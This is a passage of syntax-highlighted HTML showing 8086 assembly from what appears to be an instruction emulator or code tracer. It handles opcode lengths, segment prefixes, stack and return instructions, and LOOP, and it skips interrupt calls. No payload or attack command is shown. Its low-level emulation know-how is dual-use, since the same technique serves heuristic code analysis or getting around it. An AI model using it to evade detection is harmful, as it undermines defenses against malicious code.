        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">          </span><span class="sc1">; Correct table.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Offset is a word, so we'll have to add two</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;times the offset to jump to the right one:</span><span class="sc0">
                                </span><span class="sc1">;once done, we just jump.</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;-ú--ú-ú--ú-ú-ú--ú-ú-ú--úú-ú-úú-ú-ú--ú-ú-ú-úú-ú--ú--úú-úúú-ú-ú-ú-ú--ú-ú-ú--</span><span class="sc0">
</span><span class="sc1">;     Specific routines for non directly-executable instructions</span><span class="sc0">
</span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-ú--ú-ú--ú-ú--úú-ú-úúú-ú-úú-ú--ú-úú-ú-ú-ú</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Fixed instructions size</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@bytes6</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@bytes1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@Ya_sumado_cx_var</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">execi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ejecuci</span><span class="sc0">¢</span><span class="sc5">n</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú-</span><span class="sc0">
            </span><span class="sc1">; 0FEh Opcode</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-ú</span><span class="sc0">

</span><span class="sc5">@0FEh</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; It's interesting to see that so FEh has</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;many instructions with "byte ptr", some of</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Variable1</span><span class="sc0">      </span><span class="sc1">;them ( 50% ) are incorrect; only INC/DEC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;work</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@wrongkind</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Variable1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@wrongkind</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Variable1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@wrongkind</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@Variable1</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@wrongkind</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Invalid 8086 instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@wrongkind</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; Invalid opcode</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">         </span><span class="sc1">; Return without getting place</span><span class="sc0">



            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Non-fixed instructions</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Variable3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Non-fixed length instructions</span><span class="sc0">
</span><span class="sc5">@Variable2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@Variable1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">@fixedsup</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@es6oevar</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@trapix_optimizado2</span><span class="sc0">
</span><span class="sc5">@es6oevar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@Trapix_optimizado</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@Trapix_optimizado2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@Ya_sumado_cx_var</span><span class="sc0">
</span><span class="sc5">@fixedsup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@trapix_optimizado</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@es6oevar</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@Trapix_optimizado2</span><span class="sc0">


            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú-ú--ú-úú-ú-</span><span class="sc0">
            </span><span class="sc1">; Direct stack pushes and instruction prefixes</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú--ú-ú--ú-ú-ú</span><span class="sc0">

</span><span class="sc5">@pushstack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                    </span><span class="sc1">; All Push or pops can be emulated by normal execution.</span><span class="sc0">
                    </span><span class="sc1">;Only we've gotta emulate PUSH CS, cause we cannot</span><span class="sc0">
                    </span><span class="sc1">;emulate that opcode.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@PushCsKind</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">;If it's a push</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">@bytes1</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Segment prefixes ( CS included )</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">
</span><span class="sc5">@Prefix</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_pref</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Segment prefix on</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@OuttaPrefix</span><span class="sc0">
</span><span class="sc5">@@SigPrefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@NotCsPrefix</span><span class="sc0">       </span><span class="sc1">; Prefix isn't CS: ( this one has some</span><span class="sc0">
                                    </span><span class="sc1">;special treatment )</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ds</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_csflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">              </span><span class="sc1">; We make DS as Prefix and move CS to DS</span><span class="sc0">
                                    </span><span class="sc1">;so we activate flag on _csflag. It will</span><span class="sc0">
                                    </span><span class="sc1">;be checked and then got from _ds2,</span><span class="sc0">
                                    </span><span class="sc1">;restoring at the end of the routine</span><span class="sc0">
                                    </span><span class="sc1">;execution.</span><span class="sc0">

</span><span class="sc5">@@NotCsPrefix</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; 26h (ES:), 36h (SS:), 3eh (DS:)</span><span class="sc0">
                        </span><span class="sc1">; Repz/Repnz are also emulated here</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">execi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">@@OuttaPrefix</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@get</span><span class="sc4">&amp;</span><span class="sc5">exec_part2</span><span class="sc0">


            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; PUSH CS instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@PushCsKind</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">; Push CS: We obtain ss:sp, decrease one word, it's on ES:</span><span class="sc0">
                    </span><span class="sc1">; DI and the value is stored in that ss:sp, emulating.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Instruction: RET [number]</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@RetNum</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; The RET [num] order is exactly the same as Ret,</span><span class="sc0">
                        </span><span class="sc1">;although it adds SP the number stored in [num]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Ret_subroutine_1</span><span class="sc0">

</span><span class="sc5">@Subr_Add_Opcode</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; A¤adimos ese n£mero.</span><span class="sc0">
</span><span class="sc5">@@Ret_Return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Ret instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@RetKind</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@Ret_Return</span><span class="sc0">

</span><span class="sc5">@Ret_subroutine_1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; RETF instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">


</span><span class="sc5">@RetfKind</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@Ret_Return</span><span class="sc0">

</span><span class="sc5">@Ret_subroutine_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ss</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_ip</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; RETF [num] instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">


</span><span class="sc5">@RetfNum</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Ret_subroutine_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@Subr_Add_Opcode</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; Interrupt calls</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">

</span><span class="sc5">@Interrupt</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">; It's an interrupt call: it won't be executed, but the</span><span class="sc0">
                </span><span class="sc1">;emulator will return a CLC, as if nothing bad happened</span><span class="sc0">
                </span><span class="sc1">;with it O:)</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">execi</span><span class="sc4">],</span><span class="sc2">0f8h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ejecuci</span><span class="sc0">¢</span><span class="sc5">n</span><span class="sc0">

</span><span class="sc5">@Iretkind</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; *-*</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Ret_subroutine_2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_flags</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get</span><span class="sc4">&amp;</span><span class="sc5">exec_instruction</span><span class="sc0">

</span><span class="sc5">@getflags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; LOOPZ instruction</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">
</span><span class="sc5">@Mloopz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; LOOPZ will make Loop if zero</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_flags</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;flag is on, and Decs Cx</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@FinalLoop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">

            </span><span class="sc1">;-ú-úú-ú-ú--ú-ú--ú-ú--úú--ú-ú--ú-úú</span><span class="sc0">
            </span><span class="sc1">; LOOP &amp; LOOPNZ instructions</span><span class="sc0">
            </span><span class="sc1">;-úú-ú--ú-ú--ú-úú-úúú-ú--ú-ú--ú-úú-</span><span class="sc0">
</span><span class="sc5">@Mloop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_cx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@FinalLoop</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@Njmp</span><span class="sc0">
</span><span class="sc5">@@FinalLoop</span><span class="sc4">:</span><span class="sc0">
